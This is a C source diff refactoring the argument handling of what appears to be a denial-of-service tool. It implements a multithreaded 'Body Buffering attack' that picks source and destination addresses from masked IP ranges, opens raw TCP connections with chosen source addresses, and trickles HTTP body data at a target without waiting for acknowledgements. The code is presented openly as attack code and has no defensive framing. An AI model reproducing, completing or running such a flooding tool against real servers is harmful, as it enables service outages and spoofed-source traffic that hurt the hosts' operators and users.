@@ -14,17 +14,10 @@ extern int g_num_threads;
 __u64 g_bodybuf_num_total;
 __u64 g_bodybuf_num_generated_in_sec;
 // from main()
-unsigned char g_bodybuf_src_ip[16] = { 0, };
-unsigned char g_bodybuf_dest_ip[16] = { 0, };
-__u32 g_bodybuf_src_mask;
-__u32 g_bodybuf_dest_mask;
-__u32 g_bodybuf_dest_port_start;
-__u32 g_bodybuf_dest_port_end;
-__u32 g_bodybuf_request_per_sec;
+InputArguments g_bodybuf_input;
 // for masking next ip address
-unsigned char g_bodybuf_now_src_ip[16];
-unsigned char g_bodybuf_now_dest_ip[16];
-__u32 g_bodybuf_now_dest_port;
+MaskingArguments g_bodybuf_now;
+__u32 g_bodybuf_request_per_sec;
 // thread
 pthread_mutex_t g_bodybuf_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;
@@ -51,31 +44,22 @@ void *generate_body_buffering(void *data)
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_bodybuf_mutex);
-		generator(
-				g_bodybuf_src_ip,
-				g_bodybuf_dest_ip,
-				g_bodybuf_src_mask,
-				g_bodybuf_dest_mask,
-				g_bodybuf_dest_port_start,
-				g_bodybuf_dest_port_end,
-				g_bodybuf_now_src_ip,
-				g_bodybuf_now_dest_ip,
-				&g_bodybuf_now_dest_port);
+		get_masking_arguments(&g_bodybuf_input, &g_bodybuf_now);
 		if (body_buffering_cnt % BODY_BUFFERING_CNT == 0) {
 			sock = tcp_make_connection(
-					inet_addr(g_bodybuf_now_src_ip),
-					inet_addr(g_bodybuf_now_dest_ip),
+					inet_addr(g_bodybuf_now.src),
+					inet_addr(g_bodybuf_now.dest),
 					&src_port,
-					g_bodybuf_now_dest_port,
+					g_bodybuf_now.port,
 					&seq,
 					&ack,
 					0);
 			tcp_socket_send_data(
 					sock,
-					inet_addr(g_bodybuf_now_src_ip),
-					inet_addr(g_bodybuf_now_dest_ip),
+					inet_addr(g_bodybuf_now.src),
+					inet_addr(g_bodybuf_now.dest),
 					src_port,
-					g_bodybuf_now_dest_port,
+					g_bodybuf_now.port,
 					GET_METHOD,
 					strlen(GET_METHOD),
 					seq, ack, 0);
@@ -97,10 +81,10 @@ void *generate_body_buffering(void *data)
 
 		tcp_socket_send_data_no_ack(
 				sock,
-				inet_addr(g_bodybuf_now_src_ip),
-				inet_addr(g_bodybuf_now_dest_ip),
+				inet_addr(g_bodybuf_now.src),
+				inet_addr(g_bodybuf_now.dest),
 				src_port,
-				g_bodybuf_now_dest_port,
+				g_bodybuf_now.port,
 				data,
 				strlen(data),
 				seq,
@@ -142,14 +126,7 @@ void body_buffering_main(char *argv[])
 		body_buffering_print_usage();
 		return;
 	}
-	split_ip_mask_port(
-			argv,
-			g_bodybuf_src_ip,
-			g_bodybuf_dest_ip,
-			&g_bodybuf_src_mask,
-			&g_bodybuf_dest_mask,
-			&g_bodybuf_dest_port_start,
-			&g_bodybuf_dest_port_end);
+	argv_to_input_arguments(argv, &g_bodybuf_input);
 	g_bodybuf_num_generated_in_sec = 0;
 	g_bodybuf_num_total = 0;
 	memset(&g_bodybuf_before_time, 0, sizeof(struct timespec));
@@ -162,7 +139,7 @@ void body_buffering_main(char *argv[])
 		thread_ids[i] = i;
 	}
 	printf("Body Buffering attack to %s using %d threads\n",
-			g_bodybuf_dest_ip,
+			g_bodybuf_input.dest,
 			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
